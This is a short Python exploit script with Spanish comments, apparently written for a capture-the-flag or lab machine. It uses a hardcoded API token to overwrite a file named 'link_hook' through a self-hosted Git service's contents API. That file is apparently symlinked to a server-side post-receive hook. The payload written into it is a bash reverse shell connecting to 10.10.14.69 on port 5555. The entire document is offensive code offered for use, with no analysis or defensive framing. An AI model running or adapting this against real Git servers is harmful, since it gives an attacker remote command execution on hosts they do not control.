import requests
import base64

# Tus credenciales exactas
API_TOKEN = "e130291da5be8b3b50de0b739db865fb56faed25"
USER = "dark"
REPO = "final_pwn"
FILE = "link_hook"

URL = f"http://localhost:3001/api/v1/repos/{USER}/{REPO}/contents/{FILE}"
headers = {"Authorization": f"token {API_TOKEN}", "Content-Type": "application/json"}

# 1. Necesitamos el "SHA" del enlace para que la API nos deje sobrescribirlo
print("[*] 1. Obteniendo autorización (SHA)...")
res_get = requests.get(URL, headers=headers)
sha = res_get.json().get("sha")

if not sha:
    print("[-] Error: El servidor no encuentra el link. ¿Seguro que lo subiste con git push?")
    exit()

# 2. El payload malicioso en Base64 (Requisito de la API)
print("[*] 2. Inyectando veneno vía API PutContents...")
payload = "#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.69/5555 0>&1\n"
b64_payload = base64.b64encode(payload.encode()).decode('utf-8')

data = {
    "message": "Bypass Web API",
    "content": b64_payload,
    "sha": sha
}

# 3. El Golpe Final
res_put = requests.put(URL, headers=headers, json=data)

if res_put.status_code == 200:
    print("[+] ¡ÉXITO! La API se tragó el archivo. Está en /root/.../post-receive")
else:
    print(f"[-] Error de la API: {res_put.status_code} - {res_put.text}")
